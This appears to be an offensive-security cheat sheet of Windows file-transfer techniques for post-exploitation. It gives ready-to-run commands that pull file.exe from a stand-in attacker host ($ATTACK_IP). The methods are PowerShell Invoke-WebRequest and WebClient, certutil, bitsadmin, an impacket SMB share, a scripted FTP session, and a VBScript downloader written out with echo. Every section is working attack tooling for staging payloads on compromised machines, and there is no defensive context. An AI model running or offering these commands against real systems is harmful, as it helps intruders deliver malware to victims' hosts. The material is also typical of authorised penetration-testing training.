# Windows File Transfers

## PowerShell
```powershell
Invoke-WebRequest -Uri http://$ATTACK_IP/file.exe -OutFile file.exe
iwr -Uri http://$ATTACK_IP/file.exe -OutFile file.exe

(New-Object Net.WebClient).DownloadFile('http://$ATTACK_IP/file.exe','file.exe')
```

## certutil
```cmd
certutil -urlcache -f http://$ATTACK_IP/file.exe file.exe
```

## Bitsadmin
```cmd
bitsadmin /transfer job /download /priority high http://$ATTACK_IP/file.exe file.exe
```

## SMB
```powershell
# On Kali: sudo impacket-smbserver share /path/to/files -smb2support
# On Windows:
copy \\$ATTACK_IP\share\file.exe C:\temp\file.exe
```

## FTP
```cmd
# On Kali: sudo python3 -m pyftpdlib -p 21 -w
echo open $ATTACK_IP > ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt
```

## VBScript Fallback
```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strUrl,false >> wget.vbs
echo http.Send >> wget.vbs
echo Set objStream = CreateObject("Adodb.Stream") >> wget.vbs
echo objStream.Open >> wget.vbs
echo objStream.Type = 1 >> wget.vbs
echo objStream.Write http.ResponseBody >> wget.vbs
echo objStream.SaveToFile StrFile >> wget.vbs
```
